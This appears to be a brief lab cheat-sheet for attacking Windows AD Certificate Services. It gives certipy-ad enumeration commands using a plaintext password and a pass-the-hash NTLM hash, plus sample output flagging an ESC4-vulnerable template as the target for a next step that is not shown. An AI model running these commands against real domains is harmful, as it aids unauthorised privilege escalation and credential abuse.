
EXploit vulnerable certificates in windows


```
With known creds :

certipy-ad -debug find -u 'tel_admin01@telecore.ad' -p 'T3l@Com#1' -dc-ip 10.5.2.2 -vuln -ldap-scheme ldap -stdout

```


```
certipy-ad find -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.232.128 -target-ip 10.129.232.128 -vulnerable -enable -stdout
```

Look for the template name : 

```
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    ..
    ..
    ..
    [!] Vulnerabilities
    ESC4                              : User has dangerous permissions.
```

Here DunderMifflinAuthentication is the name ( Important to notice for the next step)


